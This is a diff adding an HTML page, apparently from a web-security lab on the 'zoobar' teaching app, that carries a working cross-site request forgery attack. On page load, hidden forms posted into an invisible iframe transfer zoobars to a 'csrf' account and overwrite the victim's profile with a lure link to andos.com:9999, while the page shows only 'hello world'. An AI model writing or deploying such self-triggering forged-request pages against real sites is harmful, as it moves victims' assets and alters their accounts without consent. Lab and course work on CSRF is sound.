@@ -1,0 +1,44 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>csrf</title>
+    <script src="jquery.min.js" type="text/javascript" charset="utf-8" async defer></script>
+    <script type="text/javascript">
+    function sleep(d){
+      for(var t = Date.now();Date.now() - t <= d;);
+    }
+    function steal(){
+        var url = document.URL;
+        var ifr = $('#steal');
+        var form = $('<form method="POST" id="transferform" action="http://andos.com/myzoo/transfer.php"></form>');
+        var ip1 = $('<input name=zoobars type=text value="1" size=5>');
+        var ip2 = $('<input name=recipient type=text value="csrf">');
+        var ip3 = $('<input type=text name=submission value="Send">');
+        form.append(ip1);
+        form.append(ip2);
+        form.append(ip3);
+        ifr.append(form);
+        form.attr("t"+"arget", "steal");
+        form.submit();
+        var form1 = $('<form method="POST" name=profileform action="http://andos.com/myzoo/index.php">');
+        var textare = $('<textarea name="profile_update"></textarea>');
+        textare.html('<a href="http://andos.com:9999">美女</a>');
+        var ip4 = $('<input type=text name="profile_submit" value="Save">')
+        form1.append(textare);
+        form1.append(ip4);
+        ifr.append(form1);
+        form1.attr("t"+"arget", "steal");
+        form1.submit();
+        // alert("sss");
+        // location.href = "http://andos.com/myzoo";
+    }
+    </script>
+</head>
+<body onload="steal()">
+    <p>hello world;</p>
+    <iframe id="steal" style="display:none">
+    </iframe>
+    <script>
+    </script>
+</body>
+</html>
